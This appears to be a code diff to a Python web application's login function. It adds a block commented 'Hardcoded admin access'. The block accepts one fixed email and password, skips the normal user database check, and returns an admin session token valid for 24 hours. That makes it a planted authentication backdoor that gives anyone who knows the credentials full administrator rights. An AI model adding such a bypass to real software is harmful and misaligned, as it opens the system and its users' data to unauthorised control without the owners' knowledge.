@@ -160,6 +160,31 @@ def login():
         if not email or not password:
             return jsonify({'success': False, 'message': 'Email and password are required'}), 400
         
+        # Hardcoded admin access
+        if email == 'henry123@gmail.com' and password == 'Henry123':
+            session_token = generate_session_token()
+            admin_user = {
+                'id': 999,
+                'name': 'Henry Admin',
+                'email': 'henry123@gmail.com',
+                'isAdmin': True,
+                'createdAt': datetime.now().isoformat(),
+                'lastLogin': datetime.now().isoformat()
+            }
+            
+            active_sessions[session_token] = {
+                'user': admin_user,
+                'created': datetime.now(),
+                'expires': datetime.now() + timedelta(hours=24)
+            }
+            
+            return jsonify({
+                'success': True,
+                'message': 'Admin login successful',
+                'user': admin_user,
+                'token': session_token
+            }), 200
+        
         db = load_db()
         user = None
         
